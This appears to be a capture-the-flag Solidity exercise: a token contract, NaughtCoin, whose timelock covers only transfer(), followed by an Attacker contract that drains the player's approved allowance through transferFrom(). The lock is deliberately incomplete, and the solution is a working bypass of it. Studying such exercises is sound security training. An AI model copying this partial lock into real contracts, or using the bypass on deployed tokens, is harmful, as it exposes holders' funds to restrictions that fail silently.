// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract NaughtCoin is ERC20 {

    // string public constant name = "NaughtCoin";
    // string public constant symbol = "0x0";
    // uint8 public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[msg.sender] = INITIAL_SUPPLY;
        _mint(msg.sender, 1000000 * 10 ** decimals());
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public virtual override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

/** CODE YOUR SOLUTION HERE */
contract Attacker {

    NaughtCoin public victim;

    constructor(NaughtCoin _victim) {
        victim = NaughtCoin(_victim);
    }

    function attack() public {
        uint256 allowance = victim.allowance(msg.sender, address(this));
        // Transfer all tokens to the attacker
        victim.transferFrom(msg.sender, address(this), allowance);
    }
}